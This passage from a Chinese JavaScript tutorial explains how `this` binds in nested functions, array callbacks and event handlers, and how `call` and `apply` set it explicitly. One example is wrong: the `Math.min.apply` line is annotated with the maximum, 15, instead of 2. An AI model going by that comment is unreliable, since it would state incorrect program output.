<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">f1</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="keyword">var</span> that = <span class="variable language_">this</span>; <span class="comment">// 使用变量保存this</span></span><br><span class="line">    <span class="keyword">var</span> f2 = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(that);</span><br><span class="line">    &#125;();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f1</span>()</span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="comment">// Object</span></span><br></pre></td></tr></table></figure>

<p>上面代码定义了变量<code>that</code>，固定指向外层的<code>this</code>，然后在内层使用<code>that</code>，就不会发生<code>this</code>指向的改变。</p>
<p>事实上，使用一个变量固定<code>this</code>的值，然后内层函数调用这个变量，是非常常见的做法，请务必掌握。</p>
<p>JavaScript 提供了严格模式，也可以硬性避免这种问题。严格模式下，如果函数内部的<code>this</code>指向顶层对象，就会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line">counter.<span class="property">inc</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">count</span>++</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> f = counter.<span class="property">inc</span>; <span class="comment">// 这里直接取出方法的内存地址赋值给f，运行环境为window</span></span><br><span class="line"><span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// TypeError: Cannot read property &#x27;count&#x27; of undefined</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>inc</code>方法通过<code>&#39;use strict&#39;</code>声明采用严格模式，这时内部的<code>this</code>一旦指向顶层对象，就会报错。</p>
<h4 id="（2）避免数组处理方法中的-this"><a href="#（2）避免数组处理方法中的-this" class="headerlink" title="（2）避免数组处理方法中的 this"></a>（2）避免数组处理方法中的 this</h4><p> 数组的<code>map</code>和<code>foreach</code>方法，允许提供一个函数作为参数。这个函数内部不应该使用<code>this</code> 。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">v</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="attr">p</span>: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  <span class="attr">f</span>: <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">p</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123; <span class="comment">// 这个方法的运行环境为window</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">v</span> + <span class="string">&#x27; &#x27;</span> + item);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// undefined a1</span></span><br><span class="line"><span class="comment">// undefined a2</span></span><br></pre></td></tr></table></figure>

<p> 上面代码中，<code>foreach</code>方法的回调函数中的<code>this</code>，其实是指向<code>window</code>对象，因此取不到<code>o.v</code>的值。原因跟上一段的多层<code>this</code>是一样的，就是内层的<code>this</code>不指向外部，而指向顶层对象。 </p>
<p>解决这个问题的一种方法，就是前面提到的，使用中间变量固定<code>this</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">v</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="attr">p</span>: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  <span class="attr">f</span>: <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> that = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">p</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(that.<span class="property">v</span>+<span class="string">&#x27; &#x27;</span>+item);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// hello a1</span></span><br><span class="line"><span class="comment">// hello a2</span></span><br></pre></td></tr></table></figure>

<p>另一种方法是将<code>this</code>当作<code>foreach</code>方法的第二个参数，固定它的运行环境。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">v</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="attr">p</span>: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  <span class="attr">f</span>: <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">p</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">v</span> + <span class="string">&#x27; &#x27;</span> + item);</span><br><span class="line">    &#125;, <span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// hello a1</span></span><br><span class="line"><span class="comment">// hello a2</span></span><br></pre></td></tr></table></figure>

<p>ES6箭头函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">v</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="attr">p</span>: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  <span class="attr">f</span>: <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">p</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123; <span class="comment">// 箭头函数使this指向为o对象</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">v</span>+<span class="string">&#x27; &#x27;</span>+item);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// hello a1</span></span><br><span class="line"><span class="comment">// hello a2</span></span><br></pre></td></tr></table></figure>



<h4 id="（3）避免回调函数中的-this"><a href="#（3）避免回调函数中的-this" class="headerlink" title="（3）避免回调函数中的 this"></a>（3）避免回调函数中的 this</h4><p>回调函数中的<code>this</code>往往会改变指向，最好避免使用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">o.<span class="property">f</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery 的写法</span></span><br><span class="line">$(<span class="string">&#x27;#button&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, o.<span class="property">f</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，点击按钮以后，控制台会显示<code>false</code>。原因是此时<code>this</code>不再指向<code>o</code>对象，而是指向按钮的 DOM 对象，因为<code>f</code>方法是在按钮对象的环境中被调用的。这种细微的差别，很容易在编程中忽视，导致难以察觉的错误。</p>
<p>为了解决这个问题，可以采用下面的一些方法对<code>this</code>进行绑定，也就是使得<code>this</code>固定指向某个对象，减少不确定性。</p>
<h3 id="5、绑定-this-的方法"><a href="#5、绑定-this-的方法" class="headerlink" title="5、绑定 this 的方法"></a>5、绑定 this 的方法</h3><p> <code>this</code>的动态切换，固然为 JavaScript 创造了巨大的灵活性，但也使得编程变得困难和模糊。有时，需要把<code>this</code>固定下来，避免出现意想不到的情况。JavaScript 提供了<code>call</code>、<code>apply</code>、<code>bind</code>这三个方法，来切换&#x2F;固定<code>this</code>的指向。 </p>
<h4 id="Function-prototype-call"><a href="#Function-prototype-call" class="headerlink" title="Function.prototype.call()"></a>Function.prototype.call()</h4><p>函数实例的<code>call</code>方法，可以<strong>指定函数内部<code>this</code>的指向（即函数执行时所在的作用域），然后在所指定的作用域中，调用该函数。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>() === <span class="variable language_">window</span> <span class="comment">// true</span></span><br><span class="line">f.<span class="title function_">call</span>(obj) === obj <span class="comment">// true 使函数内this指向obj，相当于把函数放入obj对象内运行。</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，全局环境运行函数<code>f</code>时，<code>this</code>指向全局环境（浏览器为<code>window</code>对象）；<code>call</code>方法可以改变<code>this</code>的指向，指定<code>this</code>指向对象<code>obj</code>，然后在对象<code>obj</code>的作用域中运行函数<code>f</code>。</p>
<p><strong><code>call</code>方法的参数，应该是一个对象</strong>。如果参数为空、<code>null</code>和<code>undefined</code>，则<strong>默认传入全局对象</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">n</span>: <span class="number">456</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数为空、null、undefined时默认传入全局对象</span></span><br><span class="line">a.<span class="title function_">call</span>() <span class="comment">// 123</span></span><br><span class="line">a.<span class="title function_">call</span>(<span class="literal">null</span>) <span class="comment">// 123</span></span><br><span class="line">a.<span class="title function_">call</span>(<span class="literal">undefined</span>) <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line">a.<span class="title function_">call</span>(<span class="variable language_">window</span>) <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line">a.<span class="title function_">call</span>(obj) <span class="comment">// 456</span></span><br></pre></td></tr></table></figure>

<p> 上面代码中，<code>a</code>函数中的<code>this</code>关键字，如果指向全局对象，返回结果为<code>123</code>。如果使用<code>call</code>方法将<code>this</code>关键字指向<code>obj</code>对象，返回结果为<code>456</code>。可以看到，如果<code>call</code>方法没有参数，或者参数为<code>null</code>或<code>undefined</code>，则等同于指向全局对象。 </p>
<p>如果<code>call</code>方法的参数是一个原始值，那么这个<strong>原始值会自动转成对应的包装对象</strong>，然后传入<code>call</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">f.<span class="title function_">call</span>(<span class="number">5</span>)</span><br><span class="line"><span class="comment">// Number &#123;[[PrimitiveValue]]: 5&#125; // Number的实例对象</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>call</code>的参数为<code>5</code>，不是对象，会被自动转成包装对象（<code>Number</code>的实例），绑定<code>f</code>内部的<code>this</code>。</p>
<p><code>call</code>方法还可以接受多个参数。</p>
<h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func.<span class="title function_">call</span>(thisValue, arg1, arg2, ...)</span><br><span class="line"><span class="comment">// 第一个参数thisValue为函数内this将要指向的对象</span></span><br><span class="line"><span class="comment">// 其余参数为传入函数的参数</span></span><br></pre></td></tr></table></figure>

<p><code>call</code>的第一个参数就是<code>this</code>所要指向的那个对象，后面的参数则是函数调用时所需的参数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>call</code>方法指定函数<code>add</code>内部的<code>this</code>绑定当前环境（对象），并且参数为<code>1</code>和<code>2</code>，因此函数<code>add</code>运行后得到<code>3</code>。</p>
<h5 id="应用：调用对象的原生方法"><a href="#应用：调用对象的原生方法" class="headerlink" title="应用：调用对象的原生方法"></a>应用：调用对象的原生方法</h5><p> <code>call</code>方法的一个应用是调用对象的原生方法。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false 判断obj是否有toString属性，注意这里不是toString()方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 覆盖掉继承的 hasOwnProperty 方法</span></span><br><span class="line">obj.<span class="property">hasOwnProperty</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">obj.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(obj, <span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>hasOwnProperty</code>是<code>obj</code>对象继承的方法，如果这个方法一旦被覆盖，就不会得到正确结果。<code>call</code>方法可以解决这个问题，它将<code>hasOwnProperty</code>方法的原始定义放到<code>obj</code>对象上执行，这样无论<code>obj</code>上有没有同名方法，都不会影响结果。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objArr = &#123; <span class="comment">// 类数组对象</span></span><br><span class="line">    <span class="number">0</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="number">1</span>:<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="number">2</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="attr">length</span>:<span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(objArr) <span class="comment">// 执行数组的slice方法，并把obj指定为方法的this</span></span><br><span class="line"><span class="comment">// 或 arr = [].slice.call(obj)</span></span><br><span class="line"></span><br><span class="line">arr <span class="comment">// [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>objArr</code>是一个类似数组的对象，使用<code>call</code>调用数组的<code>slice</code>方法，指定<code>objArr</code>为<code>slice</code>方法内部的<code>this</code>，<code>slice</code>方法返回值赋给<code>arr</code>。</p>
<p>另外来看看数组<code>slice</code>方法的内部实现原理</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>=<span class="keyword">function</span>(<span class="params">start,end</span>)&#123;  <span class="comment">//数组方法slice的底层内部实现</span></span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">new</span> <span class="title class_">Array</span>(); <span class="comment">//新数组</span></span><br><span class="line">    <span class="keyword">var</span> start = start || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> end = end || <span class="variable language_">this</span>.<span class="property">length</span>; <span class="comment">//this指向调用的对象，用了call之后，改变this的指向，指向传进来的对象</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=start; i&lt;end; i++)&#123;</span><br><span class="line">        result.<span class="title function_">push</span>(<span class="variable language_">this</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;	<span class="comment">//返回的为一个新的数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Function-prototype-apply"><a href="#Function-prototype-apply" class="headerlink" title="Function.prototype.apply()"></a>Function.prototype.apply()</h4><p><code>apply</code>方法的作用与<code>call</code>方法类似，也是改变<code>this</code>指向，然后再调用该函数。唯一的区别就是，它接收一个数组作为函数执行时的参数，使用格式如下。</p>
<h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func.<span class="title function_">apply</span>(thisValue, [arg1, arg2, ...])</span><br><span class="line"><span class="comment">// 第一个参数thisValue为函数内this将要指向的对象</span></span><br><span class="line"><span class="comment">// 第二个参数为一个数组，数组每一项为传入函数的参数</span></span><br></pre></td></tr></table></figure>

<p> <code>apply</code>方法的第一个参数也是<code>this</code>所要指向的那个对象，如果设为<code>null</code>或<code>undefined</code>，则等同于指定全局对象。第二个参数则是一个数组，该数组的所有成员依次作为参数，传入原函数。原函数的参数，在<code>call</code>方法中必须一个个添加，但是在<code>apply</code>方法中，必须以数组形式添加。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">x, y</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x + y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f.<span class="title function_">call</span>(<span class="literal">null</span>, <span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 2</span></span><br><span class="line">f.<span class="title function_">apply</span>(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">1</span>]) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>f</code>函数本来接受两个参数，使用<code>apply</code>方法以后，就变成可以接受一个数组作为参数。</p>
<p>利用这一点，可以做一些有趣的应用。</p>
<h5 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h5><h5 id="（1）获取数组最大-最小元素"><a href="#（1）获取数组最大-最小元素" class="headerlink" title="（1）获取数组最大&#x2F;最小元素"></a>（1）获取数组最大&#x2F;最小元素</h5><p>JavaScript 不提供找出数组最大元素的函数。结合使用<code>apply</code>方法和<code>Math.max/Math.min</code>方法，就可以返回数组的最大&#x2F;最小元素。</p>
<p><strong>利用第二个参数为数组的特点</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取最大值</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">10</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">9</span>];</span><br><span class="line"><span class="title class_">Math</span>.<span class="property">max</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, a) <span class="comment">// 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Math.max方法获取最大值</span></span><br><span class="line"><span class="comment">//Math.max(10, 2, 4, 15, 9) // 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取最小值</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">10</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">9</span>];</span><br><span class="line"><span class="title class_">Math</span>.<span class="property">min</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, a) <span class="comment">// 15    null等于绑定全局对象</span></span><br></pre></td></tr></table></figure>

<h5 id="（2）将数组的空元素变为undefined"><a href="#（2）将数组的空元素变为undefined" class="headerlink" title="（2）将数组的空元素变为undefined"></a>（2）将数组的空元素变为<code>undefined</code></h5><p>通过<code>apply</code>方法，利用<code>Array</code>构造函数将数组的空元素变成<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, [<span class="string">&#x27;a&#x27;</span>, ,<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, undefined, &#x27;b&#x27; ]</span></span><br></pre></td></tr></table></figure>

<p>空元素与<code>undefined</code>的差别在于，数组的<code>forEach</code>方法会跳过空元素，但是不会跳过<code>undefined</code>。因此，遍历内部元素的时候，会得到不同的结果。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, , <span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">print</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.<span class="title function_">forEach</span>(print)</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Array</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, a).<span class="title function_">forEach</span>(print)</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// b</span></span><br></pre></td></tr></table></figure>

<h5 id="（3）转换类似数组的对象"><a href="#（3）转换类似数组的对象" class="headerlink" title="（3）转换类似数组的对象"></a>（3）转换类似数组的对象</h5><p>另外，利用数组对象的<code>slice</code>方法，可以将一个类似数组的对象（比如<code>arguments</code>对象）转为真正的数组。</p>
<p>和使用<code>call</code>方法的效果一样。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(&#123;<span class="number">0</span>: <span class="number">1</span>, <span class="attr">length</span>: <span class="number">1</span>&#125;) <span class="comment">// [1]</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(&#123;<span class="number">0</span>: <span class="number">1</span>&#125;) <span class="comment">// []</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(&#123;<span class="number">0</span>: <span class="number">1</span>, <span class="attr">length</span>: <span class="number">2</span>&#125;) <span class="comment">// [1, undefined]</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">apply</span>(&#123;<span class="attr">length</span>: <span class="number">1</span>&#125;) <span class="comment">// [undefined]</span></span><br></pre></td></tr></table></figure>

<p>上面代码的<code>apply</code>方法的参数都是对象，但是返回结果都是数组，这就起到了将对象转成数组的目的。从上面代码可以看到，这个方法起作用的前提是，被处理的对象必须有<code>length</code>属性，以及相对应的数字键。</p>
<h5 id="（4）绑定回调函数的对象"><a href="#（4）绑定回调函数的对象" class="headerlink" title="（4）绑定回调函数的对象"></a>（4）绑定回调函数的对象</h5><p>前面的按钮点击事件的例子，可以改写如下。</p>
